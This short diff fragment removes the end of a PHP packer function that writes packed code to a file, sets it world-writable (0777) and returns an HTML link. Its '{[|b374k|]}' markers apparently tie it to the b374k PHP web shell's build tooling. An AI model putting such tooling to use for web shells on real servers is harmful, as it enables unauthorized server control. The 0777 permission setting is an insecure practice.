-			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
-		}
-	}
-
-	if(is_file($output)) unlink($output);
-	if(packer_write_file($output, $code)){
-		chmod($output, 0777);
-		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
-	}
-	return "error{[|b374k|]}";
-}
-
 ?>
